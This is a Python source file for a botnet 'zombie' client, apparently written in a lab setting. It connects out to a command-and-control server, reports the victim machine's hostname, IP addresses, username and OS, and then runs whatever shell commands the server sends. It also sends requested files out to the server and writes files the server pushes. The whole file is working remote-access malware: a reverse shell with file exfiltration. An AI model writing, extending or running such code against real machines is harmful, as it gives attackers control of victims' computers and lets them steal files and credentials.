import socket
import requests
import platform
import subprocess
import os
import json

def get_zombie_details() :
    details = {
        "pc_name" : socket.gethostname(),
        "private_ip" : socket.gethostbyname(socket.gethostname()),
        "public_ip" : requests.get("https://httpbin.org/ip").json()["origin"],
        "username" : os.getlogin(),
        "os" : platform.system()
    }
    return details

ip_address = '10.0.2.2'
port_number = 50000

# Create a TCP/IP socket of type stream and IPV4 (because of AF_INET)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
client_socket.connect((ip_address, port_number))

print("Connected to server...")

server_ready = client_socket.recv(1024).decode()
if server_ready == "ready":
    print("Server is ready to receive data...")
    # Send the details of the zombie to the server
    print("Sending zombie details to server...")
    client_socket.sendall(json.dumps(get_zombie_details()).encode())
    print("Zombie details sent to server...")

    while True:
        print("Waiting for command from server...")
        command_to_execute = client_socket.recv(1024).decode()
        print(f"Received command from server: {command_to_execute}")

        if command_to_execute == "quit":
            break
        
        elif command_to_execute.split(" ")[0] == "upload":
            filename = os.path.basename(command_to_execute.split(" ")[1])
            file_size = int(command_to_execute.split(" ")[2])

            with open(f"~/kali/Desktop/{filename}", "wb") as f:
                client_socket.send("ready".encode())
                data = client_socket.recv(file_size)
                f.write(data)
            client_socket.send("File uploaded successfully.".encode())

        elif command_to_execute.split(" ")[0] == "download":
            file_path = command_to_execute.split(" ")[1]

            with open(file_path, "rb") as f:
                client_socket.send(f.read())
        else:
            output, error = subprocess.Popen(command_to_execute, 
                                            shell=True, 
                                            stdout=subprocess.PIPE, 
                                            stderr=subprocess.PIPE
                                            ).communicate()
            
            if command_to_execute.startswith("ping"):
                with open("/tmp/output.txt", "r") as f:
                    output = f.read().encode()

            if output:
                client_socket.sendall(output)
            else:
                client_socket.sendall(error)
        print("Command output sent to server...")

# Close the socket
client_socket.close()